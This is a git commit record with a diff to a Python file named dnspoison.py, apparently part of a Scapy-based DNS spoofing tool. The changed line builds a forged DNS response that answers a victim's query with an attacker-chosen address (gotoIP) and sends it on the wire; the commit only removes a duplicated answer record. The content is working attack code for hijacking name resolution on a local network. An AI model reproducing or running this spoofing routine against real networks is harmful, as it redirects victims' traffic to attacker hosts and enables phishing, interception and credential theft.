f108f87be1f2ab6e64b1e8a533f1079836347624
m4ul <hansonlucas06@gmail.com>
2022-11-13 21:48:14 +0100

    test

--- dnspoison.py
+++ dnspoison.py
@@ -16,7 +16,7 @@ Popen([firewall], shell=True, stdout=PIPE)
 
 def dnsspoof(rec : IP):
     if rec.haslayer(DNS) and rec.getlayer(DNS).qr==0:
-        spoof = (Ether()/ IP(dst=rec[IP].src, src=rec[IP].dst)/UDP(dport=rec[UDP].sport, sport=rec[UDP].dport)/DNS(id=rec[DNS].id, qd=rec[DNS].qd, qr=1,an=DNSRR(rrname=rec[DNS].qd.qname, ttl=10, rdata=gotoIP) / DNSRR(rrname=rec[DNS].qd.qname, ttl=10, rdata=gotoIP)))
+        spoof = (Ether()/ IP(dst=rec[IP].src, src=rec[IP].dst)/UDP(dport=rec[UDP].sport, sport=rec[UDP].dport)/DNS(id=rec[DNS].id, qd=rec[DNS].qd, qr=1,an=DNSRR(rrname=rec[DNS].qd.qname, ttl=10, rdata=gotoIP) ))
         sendp(spoof, verbose=1)
 
 
